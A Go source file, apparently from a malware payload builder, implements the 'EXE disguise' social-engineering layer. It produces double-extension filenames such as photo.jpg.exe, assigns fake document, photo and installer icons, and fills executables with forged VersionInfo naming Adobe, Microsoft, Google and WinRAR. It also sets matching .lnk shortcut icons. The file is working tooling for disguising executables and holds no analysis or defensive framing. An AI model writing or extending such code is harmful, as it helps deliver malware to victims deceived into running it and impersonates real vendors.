package payload

import "strings"

// ── EXE disguise (social-engineering layer) ────────────────────────────────
// Three places used to hardcode the disguise→extension mapping independently
// (GenerateWindowsEXE, injectIconResource, server form validation) and had
// already drifted (chrome allowed but mapped nowhere, xls missing from the
// icon-preset UI). Everything here is the single source of truth.

// NormalizeDisguise lowercases and folds aliases to their canonical key.
// Unknown values pass through unchanged so callers can reject them.
func NormalizeDisguise(s string) string {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "jpeg":
		return "jpg"
	case "docx", "word":
		return "doc"
	case "xlsx":
		return "xls"
	default:
		return strings.ToLower(strings.TrimSpace(s))
	}
}

// AllowedDisguise reports whether name is a known disguise key (canonical or
// alias). folder/chrome carry icon+VersionInfo only and add no filename ext.
func AllowedDisguise(name string) bool {
	switch NormalizeDisguise(name) {
	case "jpg", "pdf", "doc", "xls", "zip", "txt", "png", "folder", "chrome":
		return true
	default:
		return false
	}
}

// DisguiseExtFor returns the double-extension fragment for a disguise
// ("jpg" → ".jpg"), or "" when the disguise adds no filename extension
// (folder, chrome installer, unknown).
func DisguiseExtFor(disguise string) string {
	switch NormalizeDisguise(disguise) {
	case "jpg":
		return ".jpg"
	case "pdf":
		return ".pdf"
	case "doc":
		return ".docx"
	case "xls":
		return ".xlsx"
	case "zip":
		return ".zip"
	case "txt":
		return ".txt"
	case "png":
		return ".png"
	default:
		return ""
	}
}

// allDisguiseExts is every extension ApplyDisguiseFilename strips before
// applying the new one, so re-generating never stacks photo.jpg.pdf.exe.
var allDisguiseExts = []string{".jpg", ".jpeg", ".pdf", ".docx", ".doc", ".xlsx", ".xls", ".zip", ".txt", ".png"}

// ApplyDisguiseFilename rewrites name to the disguised double-extension form
// (base + ext + .exe). Names without a disguise ext only gain .exe.
func ApplyDisguiseFilename(name, disguise string) string {
	ext := DisguiseExtFor(disguise)
	base := strings.TrimSuffix(name, ".exe")
	base = strings.TrimSuffix(base, ".EXE")
	for _, e := range allDisguiseExts {
		if strings.HasSuffix(strings.ToLower(base), e) {
			base = base[:len(base)-len(e)]
			break
		}
	}
	if ext != "" && !strings.Contains(strings.ToLower(name), ext) {
		return base + ext + ".exe"
	}
	if strings.HasSuffix(strings.ToLower(name), ".exe") {
		return name
	}
	return base + ".exe"
}

// DisguiseIconPreset maps a disguise to the embedded icon preset to use when
// the operator uploads no custom icon. txt/png have no dedicated .ico, so
// they fall back to the closest visual neighbour (document / photo).
func DisguiseIconPreset(disguise string) string {
	switch NormalizeDisguise(disguise) {
	case "txt":
		return "doc"
	case "png":
		return "jpg"
	default:
		return NormalizeDisguise(disguise)
	}
}

// DisguiseFileMeta returns realistic VersionInfo for a disguise:
// FileDescription, CompanyName, FileVersion and ProductVersion strings.
func DisguiseFileMeta(disguise string) (fd, cn, fvStr, pvStr string) {
	switch NormalizeDisguise(disguise) {
	case "pdf":
		return "PDF Document", "Adobe Systems Incorporated", "23.001.20143.0", "23.001.20143.0"
	case "doc":
		return "Microsoft Word Document", "Microsoft Corporation", "16.0.17328.0", "16.0.17328.0"
	case "xls":
		return "Microsoft Excel Worksheet", "Microsoft Corporation", "16.0.17328.0", "16.0.17328.0"
	case "zip":
		return "Compressed Archive", "WinRAR", "6.24.0.0", "6.24.0.0"
	case "txt":
		return "Text Document", "Microsoft Corporation", "10.0.19041.0", "10.0.19041.0"
	case "png":
		return "PNG Image", "Microsoft Corporation", "2024.11020.1000.0", "2024.11020.1000.0"
	case "folder":
		return "File Folder", "Microsoft Corporation", "10.0.19041.0", "10.0.19041.0"
	case "chrome":
		return "Chrome Installer", "Google LLC", "120.0.6099.71", "120.0.6099.71"
	default: // jpg and unknown
		return "JPEG Image", "Microsoft Corporation", "2024.11020.1000.0", "2024.11020.1000.0"
	}
}

// DisguiseFileVers parses the dotted version from DisguiseFileMeta into the
// [4]uint16 pair winres needs.
func DisguiseFileVers(disguise string) (fv, pv [4]uint16) {
	parse := func(s string) [4]uint16 {
		var out [4]uint16
		parts := strings.Split(s, ".")
		for i := 0; i < 4 && i < len(parts); i++ {
			n := 0
			for _, c := range parts[i] {
				if c < '0' || c > '9' {
					break
				}
				n = n*10 + int(c-'0')
				if n > 65535 {
					n = 65535
					break
				}
			}
			out[i] = uint16(n)
		}
		return out
	}
	_, _, fvStr, pvStr := DisguiseFileMeta(disguise)
	return parse(fvStr), parse(pvStr)
}

// DisguiseLnkIcon returns the IconLocation baked into a generated .lnk
// sitting next to the disguised exe. zip points at the guaranteed system
// zip icon; every other disguise mirrors the sibling payload embedded
// icon (exeName plus index 0), which injectIconResource always derives
// from the same disguise preset, so the shortcut can never drift from
// the payload. Empty disguise keeps the generic document icon.
func DisguiseLnkIcon(disguise, exeName string) string {
	if NormalizeDisguise(disguise) == "zip" {
		return "%SystemRoot%\\System32\\zipfldr.dll,0"
	}
	if exeName != "" {
		return exeName + ",0"
	}
	return DefaultLnkIconLocation
}
